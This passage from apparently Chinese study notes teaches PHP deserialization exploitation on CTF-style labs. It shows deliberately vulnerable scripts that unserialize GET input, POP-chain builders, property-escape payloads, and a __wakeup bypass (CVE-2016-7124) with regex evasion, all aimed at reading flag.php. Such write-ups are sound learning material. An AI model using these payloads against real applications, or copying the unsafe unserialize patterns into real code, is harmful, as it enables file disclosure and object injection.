class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240422193805684.png" alt="image-20240422193805684"></p><p>构造代码,将上面代码复制下来，删去函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>=<span class="string">&quot;flag.php&quot;</span>;<span class="comment">//首先给var赋值，因为flag在flag.php里</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//赋值完后，首先调用appen方法就需要实例化这这个类，所以我们先new一个MOdifier</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="comment">//第二步触发get，给$p辅助对象Modifier，所以先new一个Test</span></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;p = <span class="variable">$a</span>;</span><br><span class="line"><span class="comment">//第三步触发toString，给str辅助对象Test，所以先new一个Show</span></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;str=<span class="variable">$c</span>;</span><br><span class="line"><span class="comment">//最后触发wakeup，给$source赋值对象Show</span></span><br><span class="line"><span class="variable">$b</span>-&gt;source = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240422201116529.png" alt="image-20240422201116529"></p><h3 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h3><p><strong>反席列化分隔符</strong></p><p>反序列化以**;}**结束，后面的字符串不影响正常的反序列化</p><p><strong>属性逃逸</strong></p><p>一般在数据先经过一次serialize再经过unserialize，在这个中间反序列化的字符串<strong>变多</strong>或者<strong>变少</strong>的时候有可能存在反序列化属性逃逸。</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240422203155467.png" alt="image-20240422203155467"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">&quot;abcsystem()system()system()&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$arga</span>,<span class="variable">$argc</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;v1 = <span class="variable">$arga</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;v2 = <span class="variable">$argc</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$a</span>,<span class="variable">$b</span>));</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;system()&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240422203552916.png" alt="image-20240422203552916"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240422203729881.png" alt="image-20240422203729881"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$arga</span>,<span class="variable">$argc</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;v1 = <span class="variable">$arga</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;v2 = <span class="variable">$argc</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> =  <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$a</span>,<span class="variable">$b</span>));</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;pwd&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>));</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240422204912778.png" alt="image-20240422204912778"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240422205523284.png" alt="image-20240422205523284"></p><p>例题：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$safe</span>=<span class="keyword">array</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;php&quot;</span>);</span><br><span class="line">    <span class="variable">$name</span>=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>,<span class="string">&quot;hack&quot;</span>,<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>=<span class="string">&#x27;daydream&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="variable">$user</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$param</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$param</span>));</span><br><span class="line"><span class="variable">$profile</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$param</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$profile</span>-&gt;pass==<span class="string">&#x27;escaping&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240422210042900.png" alt="image-20240422210042900"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span> = <span class="string">&quot;benben&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span> = <span class="string">&quot;escaping&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br></pre></td></tr></table></figure><p>O:4:”test”:2:{s:4:”user”;s:6:”benben**”;s:4:”pass”;s:8:”escaping”;}**</p><p>加粗部分就是要逃逸的代码,$user是可以控制的，加粗部分一共29个字符，然后一个php吐出一个字符</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240422210527195.png" alt="image-20240422210527195"></p><p>所以我们需要写29个php，所以</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$param</span>=<span class="string">&#x27;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240422211453318.png" alt="image-20240422211453318"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$safe</span>=<span class="keyword">array</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;php&quot;</span>);</span><br><span class="line">    <span class="variable">$name</span>=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>,<span class="string">&quot;hk&quot;</span>,<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$vip</span> = <span class="literal">false</span> ;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>,<span class="variable">$pass</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="variable">$user</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;pass=<span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$param</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$pass</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$param</span>,<span class="variable">$pass</span>));</span><br><span class="line"><span class="variable">$profile</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$param</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$profile</span>-&gt;vip)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240422211955099.png" alt="image-20240422211955099"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span> = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span> = <span class="string">&quot;benben&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$vip</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:4:&quot;test&quot;:3:&#123;s:4:&quot;user&quot;;s:4:&quot;flag&quot;;s:4:&quot;pass&quot;;s:6:&quot;benben&quot;;s:3:&quot;vip&quot;;b:1;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240422212341637.png" alt="image-20240422212341637"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240422212356828.png" alt="image-20240422212356828"></p><p>user&#x3D;flagflagflagflagflagflagflagflagflagflag</p><p>pass&#x3D;1”;s:4:”pass”;s:6:”benben”;s:3:”vip”;b:1;}</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240422212509444.png" alt="image-20240422212509444"></p><h2 id="wakeup-绕过-反序列化漏洞-CVE-2016-7124"><a href="#wakeup-绕过-反序列化漏洞-CVE-2016-7124" class="headerlink" title="__wakeup()绕过 反序列化漏洞:CVE-2016-7124"></a>__wakeup()绕过 反序列化漏洞:CVE-2016-7124</h2><p>PHP5&lt;5.6.25</p><p>PHP7&lt;7.0.10</p><p>漏洞产生原因:如果存在_wakeup方法，调用unserilize()方法前则先调用_wakeup方法，但是序列化字符串中表示对象属性个数的值大于 真实的属性个数时，会跳过wakeup()的执行</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240422213907834.png" alt="image-20240422213907834"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include_once</span>(<span class="variable language_">$this</span>-&gt;file);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Are you daydreaming?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//sercet in flag.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240422214302481.png" alt="image-20240422214302481"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240422214345007.png" alt="image-20240422214345007"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240422214428123.png" alt="image-20240422214428123"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$file</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#echo serialize(new secret());#O:+6:&quot;secret&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;+号绕过过滤，2绕过wakeup</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:+6:&quot;secret&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240422214911144.png" alt="image-20240422214911144"></p><h3 id="攻防世界Web-php-unserialize"><a href="#攻防世界Web-php-unserialize" class="headerlink" title="攻防世界Web_php_unserialize"></a>攻防世界Web_php_unserialize</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;fl4g.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Demo</span>());<span class="comment">#O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$a</span>);      <span class="comment">//绕过正则表达式过滤</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="comment">#echo urlencode($a);#O%3A%2B4%3A%22Demo%22%3A2%3A%7Bs%3A10%3A%22%2500Demo%2500file%22%3Bs%3A8%3A%22f14g.php%22%3B%7D</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;O%3A%2B4%3A%22Demo%22%3A2%3A%7Bs%3A10%3A%22%2500Demo%2500file%22%3Bs%3A8%3A%22f14g.php%22%3B%7D&#x27;</span>;</span><br><span class="line"><span class="comment">#$a = &#x27;O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;%00Demo%00file&quot;;s:8:&quot;fl4g.php&quot;;&#125;&#x27;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># base64_encode()</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240422220359368.png" alt="image-20240422220359368"></p><p>要注意的是，自己换空值好像不行，得保存后得字符串才行。</p><h3 id="引用的利用方式"><a href="#引用的利用方式" class="headerlink" title="引用的利用方式"></a>引用的利用方式</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$enter</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line">    <span class="variable">$pass</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="variable">$pass</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$pass</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$o</span>) &#123;</span><br><span class="line">    <span class="variable">$o</span>-&gt;secret = <span class="string">&quot;*&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$o</span>-&gt;secret === <span class="variable">$o</span>-&gt;enter)<span class="comment">#===表示</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Congratulation! Here is my secret: &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no... You can&#x27;t fool me&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;are you trolling?&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240422223643678.png" alt="image-20240422223643678"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$enter</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ 